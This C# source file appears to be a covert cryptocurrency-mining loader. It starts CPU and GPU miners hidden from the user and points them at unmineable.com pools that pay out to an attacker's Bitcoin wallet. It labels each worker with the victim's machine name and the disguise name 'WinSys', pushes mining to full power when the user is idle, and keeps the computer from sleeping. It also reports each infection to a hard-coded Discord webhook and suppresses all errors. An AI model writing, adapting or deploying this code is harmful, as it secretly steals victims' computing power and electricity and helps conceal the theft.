using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern uint SetThreadExecutionState(uint esFlags);

    private const string IDENT = "WinSys";
    private const int IDLE_THRESHOLD_MS = 30000; 

    public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
        try {
            SetThreadExecutionState(0x80000000 | 0x00000001 | 0x00000040);
            NotifyDiscord("Worker ON");

            Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
            manager.IsBackground = true;
            manager.Start();

            Thread.Sleep(Timeout.Infinite);
        } catch { }
    }

    private static void RunManager(string cpuPath, string gpuPath, string wallet) {
        Process cpuProc = null;
        Process gpuProc = null;
        bool wasIdle = false;

        while (true) {
            try {
                bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
                string rawMachine = Environment.MachineName;
                string machine = "";
                foreach (char c in rawMachine) {
                    if (char.IsLetterOrDigit(c) || c == '-' || c == '_') machine += c;
                    else if (c == ' ') machine += '_';
                }

                if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
                    if (cpuProc != null && !cpuProc.HasExited) { try { cpuProc.Kill(); } catch { } }
                    
                    int threads = isIdle ? 100 : 45;
                    string cpuArgs = string.Format("-o stratum+ssl://rx.unmineable.com:443 -u BTC:{0}.{1}_{2}_CPU -p x --donate-level 1 --cpu-max-threads-hint {3}", wallet, IDENT, machine, threads);
                    
                    ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
                        Arguments = cpuArgs,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    cpuProc = Process.Start(si);
                    try { cpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { }
                }

                if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
                    if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
                        if (gpuProc != null && !gpuProc.HasExited) { try { gpuProc.Kill(); } catch { } }

                        int intensity = isIdle ? 100 : 45;
                        string gpuArgs = string.Format("--algo ETCHASH --server stratum+ssl://etchash.unmineable.com:443 --user BTC:{0}.{1}_{2}_GPU --pass x --intensity {3}", wallet, IDENT, machine, intensity);

                        ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
                            Arguments = gpuArgs,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        gpuProc = Process.Start(si);
                        try { gpuProc.PriorityClass = ProcessPriorityClass.AboveNormal; } catch { }
                    }
                }
                wasIdle = isIdle;
            } catch { }
            Thread.Sleep(5000);
        }
    }

    private static void NotifyDiscord(string msg) {
        try {
            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.CheckCertificateRevocationList = false;

            string time = DateTime.Now.ToString("HH:mm:ss");
            string payload = "{\"content\": \"`[" + time + "]` " + msg + "\"}";

            using (WebClient wc = new WebClient()) {
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.UploadString(webhookUrl, payload);
            }
        } catch { }
    }

    private static uint GetIdleTime() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = Marshal.SizeOf(lii);
        return GetLastInputInfo(ref lii) ? (uint)Environment.TickCount - lii.dwTime : 0;
    }
}
